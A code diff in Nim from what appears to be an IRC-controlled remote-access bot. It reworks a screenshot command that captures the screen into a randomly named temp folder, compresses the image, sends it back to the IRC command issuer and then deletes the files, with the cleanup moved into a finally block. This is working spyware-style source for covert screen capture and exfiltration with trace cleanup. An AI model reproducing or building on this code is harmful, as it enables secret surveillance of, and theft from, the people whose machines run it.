@@ -335,14 +335,13 @@ proc cmd_setSendSleep(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.asy
 
 
 proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
-    var current_dir = getCurrentDir()
+    randomize()
+    var
+        current_dir = getCurrentDir()
+        rand_dir_dame = rand(100000..999999)
+        rand_filename = rand(100000..999999)
+        scrndir = getTempDir() & $rand_dir_dame
     try:
-        randomize()
-        var
-            rand_dir_dame = rand(100000..999999)
-            rand_filename = rand(100000..999999)
-            scrndir = getTempDir() & $rand_dir_dame
-
         if not dirExists(scrndir):
             discard client.privmsg(event.origin,"dir missing, creating dir")
             createDir(scrndir)
@@ -367,16 +366,27 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             var faketokens:seq[string] = @["", $rand_filename & ".gz"]
             await cmd_getFileIO(event, client, faketokens)
             await client.privmsg(event.origin,"starting cleanup")
-            if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
-                removeFile(scrndir & "\\" & $rand_filename & ".bmp")
-            if fileExists(scrndir & "\\" & $rand_filename & ".gz"):
-                removeFile(scrndir & "\\" & $rand_filename & ".gz")
-            if dirExists(scrndir):
-                removeDir(scrndir)
             return
     except OSError as e:
         discard client.privmsg(event.origin, "there was trouble while taking the screenshot [" & repr(e) & "]")
     finally:
+        try:
+            if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
+                removeFile(scrndir & "\\" & $rand_filename & ".bmp")
+        except OSError as e:
+            discard client.privmsg(event.origin, "problem removing" & $rand_filename & ".bmp" & "  [" & repr(e) & "]")
+
+        try:  
+            if fileExists(scrndir & "\\" & $rand_filename & ".gz"):
+                removeFile(scrndir & "\\" & $rand_filename & ".gz")
+        except OSError as e:
+            discard client.privmsg(event.origin, "problem removing" & $rand_filename & ".gz" & "  [" & repr(e) & "]")
+
+        try:
+            if dirExists(scrndir):
+                removeDir(scrndir)
+        except OSError as e:
+            discard client.privmsg(event.origin, "problem removing" & scrndir & "  [" & repr(e) & "]")
         setCurrentDir(current_dir)  
 
 
